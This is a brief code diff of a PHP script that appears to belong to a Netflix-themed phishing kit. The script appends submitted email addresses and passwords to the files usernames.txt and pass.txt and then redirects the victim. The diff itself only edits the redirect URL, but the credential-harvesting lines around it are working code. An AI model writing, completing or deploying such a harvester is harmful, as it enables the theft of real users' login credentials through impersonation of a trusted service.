@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Netflix Username : " . $email = $_POST['emai
 ?>
 <?php
 file_put_contents("pass.txt", "Netflix Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
